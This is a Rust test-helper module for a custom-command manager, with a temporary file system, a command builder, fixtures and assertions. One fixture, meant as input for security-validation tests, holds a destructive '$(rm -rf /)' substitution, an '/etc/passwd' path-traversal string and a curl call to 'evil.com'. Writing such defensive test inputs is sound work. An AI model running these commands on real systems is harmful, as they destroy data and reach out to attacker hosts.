use std::path::PathBuf;

use tempfile::TempDir;

use crate::util::command_manager::CommandManager;
use crate::util::command_types::CommandScope;

/// Test file system helper for creating isolated test environments
pub struct TestFileSystem {
    pub temp_dir: TempDir,
    pub project_commands_dir: PathBuf,
    pub user_commands_dir: PathBuf,
}

impl TestFileSystem {
    pub fn new() -> Result<Self, std::io::Error> {
        let temp_dir = TempDir::new()?;
        let project_commands_dir = temp_dir.path().join(".amazonq").join("commands");
        let user_commands_dir = temp_dir.path().join("home").join(".amazonq").join("commands");

        // Create directories
        std::fs::create_dir_all(&project_commands_dir)?;
        std::fs::create_dir_all(&user_commands_dir)?;

        Ok(Self {
            temp_dir,
            project_commands_dir,
            user_commands_dir,
        })
    }

    pub fn create_command_file(
        &self,
        name: &str,
        content: &str,
        scope: CommandScope,
    ) -> Result<PathBuf, std::io::Error> {
        let dir = match scope {
            CommandScope::Project => &self.project_commands_dir,
            CommandScope::Global => &self.user_commands_dir,
        };

        let file_path = dir.join(format!("{}.md", name));
        std::fs::write(&file_path, content)?;
        Ok(file_path)
    }

    pub fn create_manager(&self) -> CommandManager {
        CommandManager::new_for_test(self.project_commands_dir.clone(), self.user_commands_dir.clone())
    }

    pub fn simulate_permission_error(&self, path: &PathBuf) -> Result<(), std::io::Error> {
        // On Unix systems, remove write permissions
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(path)?.permissions();
            perms.set_mode(0o444); // Read-only
            std::fs::set_permissions(path, perms)?;
        }

        // On Windows, set read-only attribute
        #[cfg(windows)]
        {
            let mut perms = std::fs::metadata(path)?.permissions();
            perms.set_readonly(true);
            std::fs::set_permissions(path, perms)?;
        }

        Ok(())
    }

    pub fn simulate_disk_full(&self) -> Result<(), std::io::Error> {
        // Create a very large file to simulate disk full condition
        // This is a simplified simulation - in real scenarios you'd mock the filesystem
        let large_file = self.temp_dir.path().join("disk_full_simulation");
        let large_content = "x".repeat(1024 * 1024); // 1MB of data
        std::fs::write(large_file, large_content)?;
        Ok(())
    }
}

/// Builder pattern for creating test commands
pub struct TestCommandBuilder {
    name: String,
    content: String,
    scope: CommandScope,
    frontmatter: Option<String>,
}

impl TestCommandBuilder {
    pub fn new(name: &str) -> Self {
        Self {
            name: name.to_string(),
            content: format!("# {}\n\nTest command content.", name),
            scope: CommandScope::Project,
            frontmatter: None,
        }
    }

    pub fn with_content(mut self, content: &str) -> Self {
        self.content = content.to_string();
        self
    }

    pub fn with_scope(mut self, scope: CommandScope) -> Self {
        self.scope = scope;
        self
    }

    pub fn build_content(&self) -> String {
        if let Some(ref frontmatter) = self.frontmatter {
            format!("---\n{}\n---\n\n{}", frontmatter, self.content)
        } else {
            self.content.clone()
        }
    }

    pub fn create_in_filesystem(&self, test_fs: &TestFileSystem) -> Result<PathBuf, std::io::Error> {
        let content = self.build_content();
        test_fs.create_command_file(&self.name, &content, self.scope.clone())
    }
}

/// Test fixtures for common command content
pub mod fixtures {
    pub const SIMPLE_COMMAND: &str = r#"# Simple Test Command

This is a simple test command for testing purposes.

## Instructions
1. Analyze the input
2. Process the data
3. Return results

## Context
This command is used for basic testing scenarios.

## Examples
- Basic usage: /project:simple-test
- With arguments: /project:simple-test arg1 arg2"#;

    pub const COMPLEX_COMMAND_WITH_FRONTMATTER: &str = r#"---
allowed_tools: ["fs_read", "execute_bash"]
timeout_seconds: 30
---

# Complex Test Command

This command demonstrates advanced features with frontmatter.

## Instructions
1. Read configuration files using fs_read
2. Execute bash commands for system information
3. Process and format results

## Context
This command requires elevated permissions and uses multiple tools.

## Examples
- Full execution: /project:complex-test
- With specific config: /project:complex-test --config=prod"#;

    pub const MALFORMED_YAML_COMMAND: &str = r#"---
invalid_yaml: [unclosed array
missing_quotes: value without quotes
---

# Malformed Command

This command has invalid YAML frontmatter."#;

    pub const SECURITY_TEST_COMMAND: &str = r#"# Security Test Command

This command contains potentially dangerous content for security testing.

## Instructions
1. $(rm -rf /) # This should be caught by security validation
2. ../../../etc/passwd # Path traversal attempt
3. `curl http://evil.com` # Command injection attempt"#;

    pub const LARGE_COMMAND: &str = r#"# Large Test Command

This command has a lot of content to test performance.

## Instructions
This is a very long instruction section that contains a lot of text to simulate
a large command file. This helps us test performance characteristics when
dealing with commands that have substantial content.

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor
incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis
nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore
eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident,
sunt in culpa qui officia deserunt mollit anim id est laborum.

## Context
More extensive context information that would be typical in a real-world
command that needs to provide comprehensive guidance to users.

## Examples
Extensive examples section with multiple use cases and scenarios."#;
}

/// Assertion helpers for testing
pub mod assertions {
    use crate::util::command_types::CustomCommand;

    pub fn assert_command_has_content(command: &CustomCommand, expected_content: &str) {
        assert!(
            command.content.contains(expected_content),
            "Command content should contain '{}', but was: {}",
            expected_content,
            command.content
        );
    }

    pub fn assert_command_file_exists(file_path: &std::path::PathBuf) {
        assert!(
            file_path.exists(),
            "Command file should exist at path: {}",
            file_path.display()
        );
    }

    pub fn assert_command_file_not_exists(file_path: &std::path::PathBuf) {
        assert!(
            !file_path.exists(),
            "Command file should not exist at path: {}",
            file_path.display()
        );
    }

    pub fn assert_cache_contains_command(cache: &std::collections::HashMap<String, CustomCommand>, command_name: &str) {
        assert!(
            cache.contains_key(command_name),
            "Cache should contain command: {}",
            command_name
        );
    }

    pub fn assert_cache_not_contains_command(
        cache: &std::collections::HashMap<String, CustomCommand>,
        command_name: &str,
    ) {
        assert!(
            !cache.contains_key(command_name),
            "Cache should not contain command: {}",
            command_name
        );
    }
}
